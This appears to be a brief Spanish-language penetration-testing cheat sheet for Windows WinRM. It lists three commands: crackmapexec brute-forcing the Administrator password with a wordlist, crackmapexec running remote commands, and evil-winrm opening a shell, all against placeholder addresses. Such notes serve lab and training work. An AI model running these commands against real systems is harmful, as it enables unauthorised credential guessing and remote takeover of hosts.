---------
- tags: #windows #rce #passthehash #crackmapexec #evilwinrm 
-----------------

### Fuerza bruta con crackmapexec 

	crackmapexec winrm x.x.x.x -u Administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt


### Ejecutar comandos con crackmapexec

	crackmapexec winrm x.x.x.x -u Administrator -p 123456789 -x "whoami"


### Shell con evil-winrm

	evil-winrm.rb -u Administrator -p 123456789 -i x.x.x.x 










  

















